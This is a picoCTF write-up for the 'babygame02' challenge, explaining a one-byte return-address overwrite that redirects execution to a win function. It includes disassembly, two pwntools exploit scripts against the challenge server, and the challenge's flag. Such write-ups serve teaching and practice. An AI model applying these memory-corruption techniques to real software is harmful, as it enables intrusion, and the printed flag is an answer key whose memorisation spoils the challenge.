# babygame02
Points: 200

Go read the introduction of babygame01 because I do not want to
repeat myself. `babygame02` is the exact same as `babygame01` except
for a few things:

1. local_aa4 does not exist anyore
2. `main` no longer calls `win` at all

Given these changes, we need to somehow jump into `win` and leak the flag.

The first attack that I tried was overwrites the return address of `main`
to `win`, but that requires a 32-bit write while we can only perform an
8-bit write.

After this I was stuck for a while trying to determine how to jump into
`win` with a single byte overwrite. I finally realizes that if the callsite
of `move_player` is sufficiently close to `win`, such that only the lowest
byte is different between the two addresses, it would be possible to
redirect `move_player` to `win`.

`move_player` callsite:
<br>**NOTE**: the address that is pushed onto the stack is the address of
`add esp, 0x10`, not `call move_player`, otherwise returning from a function
would cause an infinite loop :<
```c
        08049704 e8 6b fd        CALL       move_player                                      undefined move_player(undefined4
                 ff ff
        08049709 83 c4 10        ADD        ESP,0x10
```
`win` function:
```
        0804975d 55              PUSH       EBP
        0804975e 89 e5           MOV        EBP,ESP
        08049760 53              PUSH       EBX
        08049761 83 ec 44        SUB        ESP,0x44
        08049764 e8 d7 f9        CALL       __x86.get_pc_thunk.bx                            undefined __x86.get_pc_thunk.bx()
                 ff ff
        08049769 81 c3 97        ADD        EBX,0x2897
                 28 00 00
        0804976f 90              NOP
```

We can see that the return address that gets pushed onto the stack and
the address of the `win` function only differ by their lowest byte, which
means we can set up the player position such that when `move_player` is
called we overwrite the return address to point to `win` instead.

```python
from pwn import *

port = [insert port here]
io = remote("saturn.picoctf.net", port)

io.send(b"l" + b"\x5d")
io.send(b"w" * 4)
io.send(b"d" * (51 - 4))
io.sendline(b"w")

io.interactive()
```

Except this does not work on the server, it does not output the flag.
What is going on? Fortunately I remembered a hint I saw in the picoCTF chat,
and all you had to do was jmp over the function prolouge into the nops instead.

The culprit for the crash if you jmped into the prolouge was probably stack
alignment and sse instructions in the glibc.
```python
from pwn import *

port = [insert port here]
io = remote("saturn.picoctf.net", port)

io.send(b"l" + b"\x78")
io.send(b"w" * 4)
io.send(b"d" * (51 - 4))
io.sendline(b"w")

io.interactive()
```

# Flag: `picoCTF{gamer_jump1ng_4r0unD_5ae8925f}`